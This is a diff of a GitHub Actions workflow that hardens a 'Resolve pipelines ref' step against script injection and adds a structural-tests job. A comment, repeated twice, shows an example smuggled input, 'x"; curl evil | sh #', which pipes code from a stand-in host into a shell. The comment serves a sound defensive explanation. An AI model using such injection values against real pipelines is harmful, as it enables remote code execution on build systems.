@@ -197,12 +197,22 @@ jobs:
       # stripping everything up to the last `@` yields the ref that
       # `actions/checkout` accepts. The `pipelines_ref` input overrides this
       # for consumers who deliberately want a different script version.
+      # Pass `inputs.pipelines_ref` via the step's `env:` mapping rather
+      # than interpolating `${{ }}` directly into the `run:` script. The
+      # `${{ }}` form is substituted into the shell command at YAML-parse
+      # time, so a consumer who passes `pipelines_ref: 'x"; curl evil | sh #'`
+      # would inject arbitrary shell. With `env:`, the value is exposed
+      # through a process env var the shell only *expands* at runtime,
+      # breaking the injection path. Flagged by SonarCloud rule
+      # `GitHub Actions should not be vulnerable to script injections`.
       - name: 'Resolve pipelines ref'
         id: 'pipelines-ref'
         shell: 'bash'
+        env:
+          PIPELINES_REF: ${{ inputs.pipelines_ref }}
         run: |
-          if [ -n "${{ inputs.pipelines_ref }}" ]; then
-            ref="${{ inputs.pipelines_ref }}"
+          if [ -n "${PIPELINES_REF}" ]; then
+            ref="${PIPELINES_REF}"
           else
             ref="${GITHUB_WORKFLOW_REF##*@}"
           fi
@@ -228,6 +238,67 @@ jobs:
           name: 'terra-coverage'
           path: "${{ env.REPORT_PATH }}"
           if-no-files-found: 'warn'
+    needs: [ 'security-sast_semgrep', 'security-sast_gitleaks', 'security-sast_hadolint', 'security-sast_trivy', 'security-sca_trivy' ]
+    if: "!startsWith(github.ref, 'refs/tags/')"
+
+  # Third tier — repo-convention assertions the consumer owns. Runs
+  # `tests/structural.sh` if it exists and uploads the resulting JUnit.
+  # The script itself is deliberately not shipped upstream; every repo
+  # has its own conventions (customer dir naming, bootstrap self-
+  # containedness, shared root.hcl presence) that can't live in a shared
+  # template. Skipped silently when the consumer has no structural
+  # script. Runs in parallel with `tests-test_all` — the shell tier is
+  # offline and deps-free, no reason to queue behind the heavier tests.
+  tests-test_structural:
+    name: 'tests > test:structural'
+    runs-on: 'ubuntu-latest'
+    env:
+      REPORT_PATH: 'build/reports'
+    steps:
+      - name: 'Checkout code'
+        uses: 'actions/checkout@v6'
+
+      # Pass `inputs.pipelines_ref` via the step's `env:` mapping rather
+      # than interpolating `${{ }}` directly into the `run:` script. The
+      # `${{ }}` form is substituted into the shell command at YAML-parse
+      # time, so a consumer who passes `pipelines_ref: 'x"; curl evil | sh #'`
+      # would inject arbitrary shell. With `env:`, the value is exposed
+      # through a process env var the shell only *expands* at runtime,
+      # breaking the injection path. Flagged by SonarCloud rule
+      # `GitHub Actions should not be vulnerable to script injections`.
+      - name: 'Resolve pipelines ref'
+        id: 'pipelines-ref'
+        shell: 'bash'
+        env:
+          PIPELINES_REF: ${{ inputs.pipelines_ref }}
+        run: |
+          if [ -n "${PIPELINES_REF}" ]; then
+            ref="${PIPELINES_REF}"
+          else
+            ref="${GITHUB_WORKFLOW_REF##*@}"
+          fi
+          echo "ref=${ref}" >> "$GITHUB_OUTPUT"
+
+      - name: 'Checkout pipelines repo for shared scripts'
+        uses: 'actions/checkout@v6'
+        with:
+          repository: 'rios0rios0/pipelines'
+          ref: ${{ steps.pipelines-ref.outputs.ref }}
+          path: '.pipelines'
+
+      - name: 'Run structural tests'
+        run: |
+          export SCRIPTS_DIR="$GITHUB_WORKSPACE/.pipelines"
+          "$SCRIPTS_DIR/global/scripts/languages/terraform/structural/run.sh"
+        shell: 'bash'
+
+      - name: 'Publish structural JUnit'
+        if: 'always()'
+        uses: 'actions/upload-artifact@v4'
+        with:
+          name: 'structural-results'
+          path: "${{ env.REPORT_PATH }}/junit-structural.xml"
+          if-no-files-found: 'ignore'
     needs: [ 'security-sast_semgrep', 'security-sast_gitleaks', 'security-sast_hadolint', 'security-sast_trivy', 'security-sca_trivy' ]
     if: "!startsWith(github.ref, 'refs/tags/')"
 
